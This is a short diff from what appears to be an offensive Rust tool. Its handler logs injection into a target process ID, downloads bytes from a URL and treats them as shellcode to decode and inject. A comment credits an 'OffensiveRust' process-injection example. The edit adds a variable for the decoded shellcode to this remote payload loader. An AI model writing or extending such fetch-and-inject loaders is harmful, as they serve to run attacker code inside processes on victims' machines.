@@ -73,8 +73,9 @@ pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error
         logger.debug(format!("Injecting into PID {:?}", pid));
         let client = Client::new();
         let r = client.get(url).send().await?;
-        if r.status().is_success() {
-            // Here comes the injection
+        if r.status().is_success() {    
+            // Get the shellcode. Now we have to decode it
+            let mut shellcode_decoded: Vec<u8>; 
             let shellcode = r.bytes().await?;
             // Big thanks to trickster0
             // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
